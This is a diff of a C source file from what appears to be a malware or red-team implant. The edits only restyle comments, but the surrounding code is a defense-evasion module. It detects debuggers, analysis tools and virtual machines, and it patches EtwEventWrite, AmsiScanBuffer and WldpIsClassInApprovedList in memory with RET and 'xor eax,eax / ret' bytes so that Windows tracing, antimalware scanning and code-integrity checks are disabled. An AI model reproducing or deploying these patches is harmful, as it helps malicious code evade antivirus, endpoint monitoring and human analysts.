@@ -15,9 +15,8 @@ typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, P
 
 static int g_defense_last_error = 0;
 
-/* ------------------------------------------------------------------ */
-/* Vectored Exception Handler – MinGW-compatible __try/__except       */
-/* ------------------------------------------------------------------ */
+
+/* Vectored Exception Handler  MinGW-compatible       */ 
 static jmp_buf g_seh_jmp;
 static bool   g_seh_armed = false;
 
@@ -25,14 +24,14 @@ static LONG WINAPI DefenseSehHandler(PEXCEPTION_POINTERS pExceptionInfo) {
     if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION &&
         g_seh_armed) {
         g_seh_armed = false;
-        longjmp(g_seh_jmp, 1);   /* jump back to setjmp(0) path */
+        longjmp(g_seh_jmp, 1);   //jump back to setjmp(0) path
     }
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
-/* ------------------------------------------------------------------ */
-/* DefenseCheckDebugger                                                */
-/* ------------------------------------------------------------------ */
+
+// DefenseCheckDebugger                                             
+
 bool DefenseCheckDebugger(void) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) {
@@ -63,9 +62,9 @@ bool DefenseCheckDebugger(void) {
     return false;
 }
 
-/* ------------------------------------------------------------------ */
-/* DefenseDetectAnalysisTools                                          */
-/* ------------------------------------------------------------------ */
+
+// DefenseDetectAnalysisTools                    
+
 bool DefenseDetectAnalysisTools(void) {
     const char *badProcs[] = {
         "procmon.exe", "procmon64.exe",
@@ -124,9 +123,8 @@ bool DefenseDetectAnalysisTools(void) {
     return false;
 }
 
-/* ------------------------------------------------------------------ */
-/* DefenseDetectVirtualMachine                                         */
-/* ------------------------------------------------------------------ */
+
+// DefenseDetectVirtualMachine                               
 bool DefenseDetectVirtualMachine(void) {
     const char *vmProcs[] = {
         "vmware", "vbox", "qemu", "xen",
@@ -164,9 +162,9 @@ bool DefenseDetectVirtualMachine(void) {
     return found;
 }
 
-/* ------------------------------------------------------------------ */
-/* DefensePatchETW  – RET patch on EtwEventWrite                      */
-/* ------------------------------------------------------------------ */
+
+// DefensePatchETW   RET patch on EtwEventWrite                    
+
 bool DefensePatchETW(void) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) {
@@ -189,7 +187,7 @@ bool DefensePatchETW(void) {
         return false;
     }
 
-    BYTE ret = 0xC3;  /* RET instruction */
+    BYTE ret = 0xC3;  // RET instruction
 
     PVOID vehHandle = AddVectoredExceptionHandler(1, DefenseSehHandler);
     if (!vehHandle) {
@@ -209,7 +207,7 @@ bool DefensePatchETW(void) {
         MiseryLog(MISERY_LOG_INFO, "DefensePatchETW: Success");
         return true;
     } else {
-        /* Exception caught – memcpy faulted (shouldn't happen after VirtualProtect) */
+        //Exception caught
         g_seh_armed = false;
         RemoveVectoredExceptionHandler(vehHandle);
         VirtualProtect(pEtw, 1, oldProtect, &oldProtect);
@@ -218,9 +216,9 @@ bool DefensePatchETW(void) {
     }
 }
 
-/* ------------------------------------------------------------------ */
-/* DefensePatchAMSI – xor eax,eax / ret on AmsiScanBuffer             */
-/* ------------------------------------------------------------------ */
+
+//DefensePatchAMSI
+
 bool DefensePatchAMSI(void) {
     HMODULE hAmsi = LoadLibraryA("amsi.dll");
     if (!hAmsi) {
@@ -243,7 +241,7 @@ bool DefensePatchAMSI(void) {
         return false;
     }
 
-    BYTE patch[] = { 0x31, 0xC0, 0xC3 };  /* xor eax,eax / ret */
+    BYTE patch[] = { 0x31, 0xC0, 0xC3 };  // xor eax,eax / ret
 
     PVOID vehHandle = AddVectoredExceptionHandler(1, DefenseSehHandler);
     if (!vehHandle) {
@@ -271,9 +269,9 @@ bool DefensePatchAMSI(void) {
     }
 }
 
-/* ------------------------------------------------------------------ */
-/* DefensePatchWLDP – xor eax,eax / ret on WldpIsClassInApprovedList   */
-/* ------------------------------------------------------------------ */
+
+// DefensePatchWLDP – xor eax,eax / ret on WldpIsClassInApprovedList
+
 bool DefensePatchWLDP(void) {
     HMODULE hWldp = GetModuleHandleA("wldp.dll");
     if (!hWldp) {
@@ -324,9 +322,8 @@ bool DefensePatchWLDP(void) {
     }
 }
 
-/* ------------------------------------------------------------------ */
-/* DefenseHideFromDebugger – ProcessDynamicEHContinuationTarget (0x11) */
-/* ------------------------------------------------------------------ */
+
+// DefenseHideFromDebugger – ProcessDynamicEHContinuationTarget (0x11) 
 bool DefenseHideFromDebugger(void) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return false;
@@ -347,17 +344,15 @@ bool DefenseHideFromDebugger(void) {
     return true;
 }
 
-/* ------------------------------------------------------------------ */
-/* DefenseHideProcessFromToolhelp                                      */
-/* ------------------------------------------------------------------ */
+
+// DefenseHideProcessFromToolhelp                  
 bool DefenseHideProcessFromToolhelp(void) {
     MiseryLog(MISERY_LOG_INFO, "DefenseHideProcessFromToolhelp: Requires kernel support (skipping)");
     return false;
 }
 
-/* ------------------------------------------------------------------ */
-/* Utility                                                             */
-/* ------------------------------------------------------------------ */
+
+// Utility                                               
 void DefenseResetSecurityChecks(void) {
     g_defense_last_error = 0;
 }
